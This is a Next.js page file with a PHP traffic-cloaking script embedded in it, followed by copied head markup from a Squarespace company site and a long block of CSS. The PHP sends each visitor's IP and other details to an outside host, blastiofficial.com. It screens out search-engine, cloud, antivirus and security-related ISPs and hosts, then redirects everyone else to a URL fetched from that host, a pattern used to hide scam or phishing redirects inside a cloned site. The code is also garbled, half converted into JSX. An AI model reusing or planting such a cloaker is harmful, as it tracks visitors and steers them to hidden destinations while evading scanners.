import Image from 'next/image'

export default function Home() {
  return (
    <main className="flex min-h-screen flex-col items-center justify-between p-24">
      <div className="z-10 w-full max-w-5xl items-center justify-between font-mono text-sm lg:flex">
        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
          Get started by editing&nbsp;
          <code className="font-mono font-bold">app/page.tsx</code>
        {/*?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['CF-Connecting-IP'] ?? $_SERVER['Cf-Connecting-Ip'] ?? $_SERVER['cf-connecting-ip'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['Forwarded'] ?? $_SERVER['forwarded'] ?? $_SERVER['x-real-ip'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['x-forwarded-for'] ?? $_SERVER['REMOTE_ADDR'] ?? $_SERVER['HTTP_USER_AGENT'] ?? $_SERVER['HTTP_DEVICE_STOCK_UA'] ?? $_SERVER['HTTP_X_OPERAMINI_PHONE_UA'] ?? $_SERVER['HEROKU_APP_DIR'] ?? $_SERVER['X_FB_HTTP_ENGINE'] ?? $_SERVER['X_PURPOSE'] ?? $_SERVER['REQUEST_SCHEME'] ?? $_SERVER['CONTEXT_DOCUMENT_ROOT'] ?? $_SERVER['SCRIPT_FILENAME'] ?? $_SERVER['REQUEST_URI'] ?? $_SERVER['SCRIPT_NAME'] ?? $_SERVER['PHP_SELF'] ?? $_SERVER['REQUEST_TIME_FLOAT'] ?? $_SERVER['HTTP_COOKIE'] ?? $_SERVER['HTTP_ACCEPT_ENCODING'] ?? $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? $_SERVER['QUERY_STRING'] ?? $_SERVER['X_WAP_PROFILE'] ?? $_SERVER['PROFILE'] ?? $_SERVER['WAP_PROFILE'] ?? $_SERVER['HTTP_REFERER'] ?? $_SERVER['HTTP_HOST'] ?? $_SERVER['HTTP_VIA'] ?? $_SERVER['HTTP_CONNECTION'] ?? $_SERVER['HTTP_X_REQUESTED_WITH'] ?? $_SERVER['REMOTE_ADDR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_INCAP_CLIENT_IP'] ?? $_SERVER['HTTP_X_SUCURI_CLIENTIP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'];
$apiUrl = "http://ip-api.com/json/{$ip}";
$response = file_get_contents($apiUrl);
$data = json_decode($response);

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referrer = $_SERVER['HTTP_REFERER'] ?? '';

$country = $data-*/}country ?? null;
        $city = $data-&gt;city ?? null;
        $isp = $data-&gt;isp ?? null;
        $hostName = gethostbyaddr($ip);
        $os = '';
        $device = 'Unknown';
        if (preg_match('/Windows/i', $userAgent)) {'{'}
        $os = 'Windows';
        {'}'} elseif (preg_match('/Android/i', $userAgent)) {'{'}
        $os = 'Android';
        {'}'} elseif (preg_match('/Linux/i', $userAgent)) {'{'}
        $os = 'Linux';
        {'}'} elseif (preg_match('/iOS/i', $userAgent)) {'{'}
        $os = 'iOS';
        {'}'} elseif (preg_match('/Mac OS X/i', $userAgent)) {'{'}
        $os = 'macOS';
        {'}'}
        if (preg_match('/(Windows|Linux|Macintosh)/i', $userAgent)) {'{'}
        if (preg_match('/Mobile/i', $userAgent)) {'{'}
        $device = 'Mobile';
        {'}'} elseif (preg_match('/Tablet/i', $userAgent)) {'{'}
        $device = 'Tablet';
        {'}'} else {'{'}
        $device = 'Desktop';
        {'}'}
        {'}'}
        $blockedISPs = [
        'Google LLC', 
        'SoftLayer', 
        'Google Singapore', 
        'DigitalOcean',
        'Amazon', 
        'Google', 
        'Microsoft', 
        'Facebook', 
        'Yahoo', 
        'Apple', 
        'Alibaba', 
        'Tencent',
        'Malware',
        'Huawei',
        'Clouds',
        'BLU VH',
        'OVH US',
        'Comcast',
        'Computer',
        'AOL',
        'Verizon',
        'Level',
        'Sprint',
        'Norton',
        'Avast'
        ];
        $blockedHosts = [
        'google', 
        'amazon', 
        'reverse', 
        'facebook', 
        'yahoo', 
        'apple', 
        'alibaba', 
        'tencent',
        'malware',
        'huawei',
        'hwclouds',
        'clouds',
        'googleusercontent',
        'digitalocean',
        'vps',
        'ovh',
        '1blu',
        'com',
        'baidu',
        'yandex',
        'wordpress',
        'joomla',
        'drupal',
        'python',
        'ruby',
        'php',
        'asp',
        'nginx'
        ];
        $blockedKeywords = [
        'google', 
        'amazon', 
        'reverse', 
        'facebook', 
        'yahoo', 
        'apple', 
        'alibaba', 
        'tencent',
        'malware',
        'huawei',
        'hwclouds',
        'clouds',
        'googleusercontent',
        'digitalocean',
        'vps',
        'ovh',
        '1blu',
        'com',
        'BLU VH',
        'OVH US',
        'Comcast',
        'python',
        'proxy',
        'tor',
        'vpn',
        'exploit',
        'hacker',
        'phishing',
        'ddos',
        'botnet',
        'rootkit'
        ];
        $isBlockedUserAgent = false;
        $redirectReason = 'Yönlendirildi | Success';
        foreach ($blockedISPs as $blockedISP) {'{'}
        if (stripos($isp, $blockedISP) !== false) {'{'}
        $isBlockedUserAgent = true;
        $redirectReason = 'Yasaklı ISP | Blocked ISP';
        break;
        {'}'}
        {'}'}
        foreach ($blockedHosts as $blockedHost) {'{'}
        if (stripos($hostName, $blockedHost) !== false) {'{'}
        $isBlockedUserAgent = true;
        $redirectReason = 'Yasaklı Host | Blocked Host';
        break;
        {'}'}
        {'}'}
        foreach ($blockedKeywords as $blockedKeyword) {'{'}
        if (stripos($isp, $blockedKeyword) !== false || stripos($hostName, $blockedKeyword) !== false) {'{'}
        $isBlockedUserAgent = true;
        $redirectReason = 'ISP veya Host Yasaklı | Blocked ISP &amp; Host';
        break;
        {'}'}
        {'}'}
        $site = $_SERVER['HTTP_HOST'];
        $date = date('d-m-Y H:i:s');
        $isRedirected = $isBlockedUserAgent ? 0 : 1;
        function sendToRemoteDB($data) {'{'}
        $url = 'https://blastiofficial.com/insert.php';
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
        {'}'}
        $dataToSend = [
        'ip' =&gt; $ip,
        'device' =&gt; $device,
        'userAgent' =&gt; $userAgent,
        'country' =&gt; $country,
        'city' =&gt; $city,
        'isp' =&gt; $isp,
        'host' =&gt; $hostName,
        'os' =&gt; $os,
        'referrer' =&gt; $referrer,
        'isRedirected' =&gt; $isRedirected,
        'redirectReason' =&gt; $redirectReason,
        'site' =&gt; $site,
        'date' =&gt; $date
        ];
        $remoteResponse = sendToRemoteDB($dataToSend);
        function fetchRedirectUrl($site) {'{'}
        $url = 'https://blastiofficial.com/fetch_link.php';
        $data = ['site' =&gt; $site];
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
        $result = json_decode($response, true);
        return $result;
        {'}'}
        $redirectUrl = fetchRedirectUrl($site);
        if ($remoteResponse === 'success') {'{'}
        if ($isRedirected &amp;&amp; $redirectUrl['site2'] !== 'none') {'{'}
        header('Location: ' . $redirectUrl['site2']);
        exit;
        {'}'}
        // Eğer yasaklı kullanıcı ise veya 'durum' 'Pasif' ise mevcut sayfada kal
        // echo "Yönlendirme yapılmadı: " . $redirectReason;
        {'}'} else {'{'}
        // echo "Hata: Uzak sunucuya gönderilemedi.";
        exit;
        {'}'}
        ?&gt;
        <meta httpEquiv="X-UA-Compatible" content="IE=edge,chrome=1" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        {/* This is Squarespace. */}{/* cayugatech */}
        {/*<base href="">*/}
        <meta charSet="utf-8" />
        <title>Custom Data Cloud Solutions | BoBoCayuga Technologies</title>
        <meta httpEquiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model" /><link rel="icon" type="image/x-icon" href="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/3abd670b-16d1-4b7e-ae55-1f0a3b04fc4f/favicon.ico?format=100w" />
        <link rel="canonical" href="index.php" />
        <meta property="og:site_name" content="cayugatech" />
        <meta property="og:title" content="Custom Data Cloud Solutions | BoBoCayuga Technologies" />
        <meta property="og:url" content="index.php" />
        <meta property="og:type" content="website" />
        <meta property="og:description" content="BoBoCayuga Technologies helps you harness the limitless possibilities of cloud and AI-driven data management with intelligent automation, analytics, and personalized insights." />
        <meta property="og:image" content="http://static1.squarespace.com/static/64ee27cd6569ab5563a1b294/t/64f3bcbc40528d2d3cbdd4e5/1693695164233/BoBoCayuga-Tech-logo-horizontal.png?format=1500w" />
        <meta property="og:image:width" content={220} />
        <meta property="og:image:height" content={75} />
        <meta itemProp="name" content="Custom Data Cloud Solutions | BoBoCayuga Technologies" />
        <meta itemProp="url" content="index.php" />
        <meta itemProp="description" content="BoBoCayuga Technologies helps you harness the limitless possibilities of cloud and AI-driven data management with intelligent automation, analytics, and personalized insights." />
        <meta itemProp="thumbnailUrl" content="http://static1.squarespace.com/static/64ee27cd6569ab5563a1b294/t/64f3bcbc40528d2d3cbdd4e5/1693695164233/BoBoCayuga-Tech-logo-horizontal.png?format=1500w" />
        <link rel="image_src" href="http://static1.squarespace.com/static/64ee27cd6569ab5563a1b294/t/64f3bcbc40528d2d3cbdd4e5/1693695164233/BoBoCayuga-Tech-logo-horizontal.png?format=1500w" />
        <meta itemProp="image" content="http://static1.squarespace.com/static/64ee27cd6569ab5563a1b294/t/64f3bcbc40528d2d3cbdd4e5/1693695164233/BoBoCayuga-Tech-logo-horizontal.png?format=1500w" />
        <meta name="twitter:title" content="Custom Data Cloud Solutions | BoBoCayuga Technologies" />
        <meta name="twitter:image" content="http://static1.squarespace.com/static/64ee27cd6569ab5563a1b294/t/64f3bcbc40528d2d3cbdd4e5/1693695164233/BoBoCayuga-Tech-logo-horizontal.png?format=1500w" />
        <meta name="twitter:url" content="index.php" />
        <meta name="twitter:card" content="summary" />
        <meta name="twitter:description" content="BoBoCayuga Technologies helps you harness the limitless possibilities of cloud and AI-driven data management with intelligent automation, analytics, and personalized insights." />
        <meta name="description" content="BoBoCayuga Technologies helps you harness the limitless possibilities of cloud 
and AI-driven data management with intelligent automation, analytics, and 
personalized insights." />
        <link rel="preconnect" href="https://images.squarespace-cdn.com" />
        <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:ital,wght@0,400;0,700;1,400;1,700" />
        <link rel="stylesheet" type="text/css" href="https://static1.squarespace.com/static/versioned-site-css/64ee27cd6569ab5563a1b294/128/5c5a519771c10ba3470d8101/64ee27cd6569ab5563a1b29e/1478/site.css" />{/* Google Tag Manager */}
        {/* End Google Tag Manager */}
        {/* Auto Scroll Layout Sections from Will-Myers.com */}
        {/* End of Squarespace Headers */}
        <style id="colorThemeStyles" dangerouslySetInnerHTML={{__html: ":root {--white-hsl:0,0%,100%;--black-hsl:0,0%,0%;--safeLightAccent-hsl:204.39,79.49%,38.24%;--safeDarkAccent-hsl:204.39,79.49%,38.24%;--safeInverseAccent-hsl:0,0%,100%;--safeInverseLightAccent-hsl:0,0%,100%;--safeInverseDarkAccent-hsl:0,0%,100%;--accent-hsl:204.39,79.49%,38.24%;--lightAccent-hsl:216,6.49%,84.9%;--darkAccent-hsl:204.51,59.660000000000004%,76.67%;}\n        \n        :root {--announcement-bar-background-color:hsla(var(--black-hsl),1);--announcement-bar-text-color:hsla(var(--white-hsl),1);--backgroundOverlayColor:hsla(var(--white-hsl),1);--course-item-nav-active-lesson-background-color:hsla(var(--darkAccent-hsl),1);--course-item-nav-active-lesson-text-color:hsla(var(--white-hsl),1);--course-item-nav-background-color:hsla(var(--lightAccent-hsl),1);--course-item-nav-border-color:hsla(var(--darkAccent-hsl),0.25);--course-item-nav-text-color:hsla(var(--black-hsl),1);--course-list-course-progress-bar-color:hsla(var(--accent-hsl),1);--course-list-course-item-background:hsla(var(--lightAccent-hsl),1);--course-list-course-item-hover-background:hsla(var(--lightAccent-hsl),0.75);--course-list-course-item-text-color:hsla(var(--black-hsl),1);--course-list-course-chapter-divider-color:hsla(var(--white-hsl),1);--course-list-grid-layout-chapter-divider-color:hsla(var(--black-hsl),1);--course-list-grid-layout-course-item-background-color:hsla(var(--lightAccent-hsl),1);--course-list-grid-layout-course-item-hover-background-color:hsla(var(--lightAccent-hsl),0.75);--course-list-grid-layout-course-item-text-color:hsla(var(--black-hsl),1);--course-list-grid-layout-course-item-border-color:hsla(var(--darkAccent-hsl),1);--gradientHeaderBackgroundColor:hsla(var(--white-hsl),1);--gradientHeaderBorderColor:hsla(var(--black-hsl),1);--gradientHeaderDropShadowColor:hsla(var(--black-hsl),1);--gradientHeaderNavigationColor:hsla(var(--black-hsl),1);--headerDropShadowColor:hsla(var(--black-hsl),1);--headerBorderColor:hsla(var(--black-hsl),1);--headingExtraLargeColor:hsla(var(--black-hsl),1);--headingLargeColor:hsla(var(--black-hsl),1);--headingLinkColor:hsla(var(--safeDarkAccent-hsl),1);--headingMediumColor:hsla(var(--black-hsl),1);--headingSmallColor:hsla(var(--black-hsl),1);--image-block-card-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-card-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-card-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-card-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-card-image-title-bg-color:hsla(var(--white-hsl),0);--image-block-card-image-title-color:hsla(var(--black-hsl),1);--image-block-card-inline-link-color:hsla(var(--black-hsl),1);--image-block-collage-background-color:hsla(var(--lightAccent-hsl),1);--image-block-collage-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-collage-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-collage-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-collage-image-title-bg-color:hsla(var(--white-hsl),0);--image-block-collage-image-title-color:hsla(var(--black-hsl),1);--image-block-collage-inline-link-color:hsla(var(--black-hsl),1);--image-block-overlap-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-overlap-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-overlap-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-overlap-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-overlap-image-title-bg-color:hsla(var(--white-hsl),1);--image-block-overlap-image-title-color:hsla(var(--black-hsl),1);--image-block-overlap-inline-link-color:hsla(var(--black-hsl),1);--image-block-overlay-color:hsla(var(--black-hsl),0.5);--image-block-poster-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-poster-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-poster-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-poster-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-poster-image-title-bg-color-v2:hsla(var(--white-hsl),0);--image-block-poster-image-title-color:hsla(var(--white-hsl),1);--image-block-poster-inline-link-color:hsla(var(--white-hsl),1);--image-block-stack-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-stack-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-stack-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-stack-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-stack-image-title-bg-color:hsla(var(--white-hsl),0);--image-block-stack-image-title-color:hsla(var(--black-hsl),1);--image-block-stack-inline-link-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-arrow-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-arrow-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-card-color:hsla(var(--lightAccent-hsl),1);--list-section-banner-slideshow-card-description-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-card-description-link-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-card-title-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-description-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-title-color:hsla(var(--black-hsl),1);--list-section-carousel-arrow-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-arrow-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-card-color:hsla(var(--lightAccent-hsl),1);--list-section-carousel-card-description-color:hsla(var(--black-hsl),1);--list-section-carousel-card-description-link-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-card-title-color:hsla(var(--black-hsl),1);--list-section-carousel-description-color:hsla(var(--black-hsl),1);--list-section-carousel-title-color:hsla(var(--black-hsl),1);--list-section-simple-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-simple-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-simple-card-color:hsla(var(--lightAccent-hsl),1);--list-section-simple-card-description-color:hsla(var(--black-hsl),1);--list-section-simple-card-description-link-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-card-title-color:hsla(var(--black-hsl),1);--list-section-simple-description-color:hsla(var(--black-hsl),1);--list-section-simple-title-color:hsla(var(--black-hsl),1);--list-section-title-color:hsla(var(--black-hsl),1);--menuOverlayBackgroundColor:hsla(var(--white-hsl),1);--menuOverlayButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--menuOverlayButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--menuOverlayNavigationLinkColor:hsla(var(--black-hsl),1);--navigationLinkColor:hsla(var(--black-hsl),1);--paragraphLargeColor:hsla(var(--black-hsl),1);--paragraphLinkColor:hsla(var(--safeDarkAccent-hsl),1);--paragraphMediumColor:hsla(var(--black-hsl),1);--paragraphSmallColor:hsla(var(--black-hsl),1);--portfolio-grid-basic-title-color:hsla(var(--black-hsl),1);--portfolio-grid-overlay-overlay-color:hsla(var(--white-hsl),1);--portfolio-grid-overlay-title-color:hsla(var(--black-hsl),1);--portfolio-hover-follow-title-color:hsla(var(--black-hsl),1);--portfolio-hover-static-title-color:hsla(var(--black-hsl),1);--portfolio-index-background-title-color:hsla(var(--black-hsl),1);--primaryButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--primaryButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--secondaryButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--secondaryButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--section-divider-stroke-color:hsla(var(--safeDarkAccent-hsl),1);--section-inset-border-color:hsla(var(--white-hsl),1);--shape-block-background-color:hsla(var(--lightAccent-hsl),1);--shape-block-dropshadow-color:hsla(var(--lightAccent-hsl),1);--shape-block-stroke-color:hsla(var(--black-hsl),1);--siteBackgroundColor:hsla(var(--white-hsl),1);--siteTitleColor:hsla(var(--black-hsl),1);--social-links-block-main-icon-color:hsla(var(--black-hsl),1);--social-links-block-secondary-icon-color:hsla(var(--white-hsl),1);--solidHeaderBackgroundColor:hsla(var(--white-hsl),1);--solidHeaderBorderColor:hsla(var(--black-hsl),1);--solidHeaderDropShadowColor:hsla(var(--black-hsl),1);--solidHeaderNavigationColor:hsla(var(--black-hsl),1);--summary-block-limited-availability-label-color:hsla(var(--black-hsl),1);--tertiaryButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--tertiaryButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--text-highlight-color:hsla(var(--safeDarkAccent-hsl),1);--text-highlight-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-accordion-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-accordion-block-divider-color:hsla(var(--black-hsl),1);--tweak-accordion-block-divider-color-on-background:hsla(var(--black-hsl),1);--tweak-accordion-block-icon-color:hsla(var(--black-hsl),1);--tweak-accordion-block-icon-color-on-background:hsla(var(--black-hsl),1);--tweak-blog-alternating-side-by-side-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-alternating-side-by-side-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-alternating-side-by-side-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-title-color:hsla(var(--black-hsl),1);--tweak-blog-basic-grid-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-basic-grid-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-basic-grid-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-basic-grid-list-title-color:hsla(var(--black-hsl),1);--tweak-blog-item-author-profile-color:hsla(var(--black-hsl),1);--tweak-blog-item-comment-meta-color:hsla(var(--black-hsl),1);--tweak-blog-item-comment-text-color:hsla(var(--black-hsl),1);--tweak-blog-item-meta-color:hsla(var(--black-hsl),1);--tweak-blog-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-blog-item-pagination-meta-color:hsla(var(--black-hsl),1);--tweak-blog-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-blog-item-title-color:hsla(var(--black-hsl),1);--tweak-blog-masonry-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-masonry-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-masonry-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-masonry-list-title-color:hsla(var(--black-hsl),1);--tweak-blog-side-by-side-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-side-by-side-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-side-by-side-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-side-by-side-list-title-color:hsla(var(--black-hsl),1);--tweak-blog-single-column-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-single-column-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-single-column-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-single-column-list-title-color:hsla(var(--black-hsl),1);--tweak-content-link-block-title-color:hsla(var(--black-hsl),1);--tweak-events-item-pagination-date-color:hsla(var(--black-hsl),1);--tweak-events-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-events-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-form-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-form-block-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-button-background-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-form-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-form-block-caption-color:hsla(var(--black-hsl),1);--tweak-form-block-caption-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-description-color:hsla(var(--black-hsl),1);--tweak-form-block-description-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-option-color:hsla(var(--black-hsl),1);--tweak-form-block-option-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-survey-title-color:hsla(var(--black-hsl),1);--tweak-form-block-survey-title-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-title-color:hsla(var(--black-hsl),1);--tweak-form-block-title-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-fill-color:hsla(var(--lightAccent-hsl),1);--tweak-form-block-field-fill-color-hsl:var(--lightAccent-hsl);--tweak-form-block-field-fill-color-a:1;--tweak-form-block-field-border-color:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-hsl:var(--black-hsl);--tweak-form-block-field-border-color-a:1;--tweak-form-block-field-input-color:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-hsl:var(--black-hsl);--tweak-form-block-field-input-color-a:1;--tweak-form-block-field-accessory-color:hsla(var(--black-hsl),1);--tweak-form-block-field-fill-color-on-background:hsla(var(--white-hsl),1);--tweak-form-block-field-fill-color-on-background-hsl:var(--white-hsl);--tweak-form-block-field-fill-color-on-background-a:1;--tweak-form-block-field-border-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-border-color-on-background-a:1;--tweak-form-block-field-input-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-input-color-on-background-a:1;--tweak-form-block-field-accessory-color-on-background:hsla(var(--black-hsl),1);--tweak-gallery-icon-background-color:hsla(var(--white-hsl),1);--tweak-gallery-icon-color:hsla(var(--black-hsl),1);--tweak-gallery-lightbox-background-color:hsla(var(--white-hsl),1);--tweak-gallery-lightbox-icon-color:hsla(var(--black-hsl),1);--tweak-heading-extra-large-color-on-background:hsla(var(--black-hsl),1);--tweak-heading-large-color-on-background:hsla(var(--black-hsl),1);--tweak-heading-medium-color-on-background:hsla(var(--black-hsl),1);--tweak-heading-small-color-on-background:hsla(var(--black-hsl),1);--tweak-line-block-line-color:hsla(var(--black-hsl),1);--tweak-marquee-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-marquee-block-heading-color:hsla(var(--black-hsl),1);--tweak-marquee-block-heading-color-on-background:hsla(var(--black-hsl),1);--tweak-marquee-block-paragraph-color:hsla(var(--black-hsl),1);--tweak-marquee-block-paragraph-color-on-background:hsla(var(--black-hsl),1);--tweak-menu-block-item-description-color:hsla(var(--black-hsl),1);--tweak-menu-block-item-price-color:hsla(var(--black-hsl),1);--tweak-menu-block-item-title-color:hsla(var(--black-hsl),1);--tweak-menu-block-nav-color:hsla(var(--black-hsl),1);--tweak-menu-block-title-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-newsletter-block-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-button-background-color-on-background:hsla(var(--black-hsl),1);--tweak-newsletter-block-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-newsletter-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-newsletter-block-description-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-description-color-on-background:hsla(var(--black-hsl),1);--tweak-newsletter-block-footnote-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-footnote-color-on-background:hsla(var(--black-hsl),1);--tweak-newsletter-block-title-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-title-color-on-background:hsla(var(--black-hsl),1);--tweak-paragraph-large-color-on-background:hsla(var(--black-hsl),1);--tweak-paragraph-link-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-medium-color-on-background:hsla(var(--black-hsl),1);--tweak-paragraph-small-color-on-background:hsla(var(--black-hsl),1);--tweak-portfolio-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-portfolio-item-pagination-meta-color:hsla(var(--black-hsl),1);--tweak-portfolio-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-breadcumb-nav-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-description-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-gallery-controls-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-product-basic-item-price-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-scarcity-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-title-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-variant-fields-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-category-nav-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-pagination-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-price-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-scarcity-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-status-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-title-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-button-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-controls-color:hsla(var(--black-hsl),1);--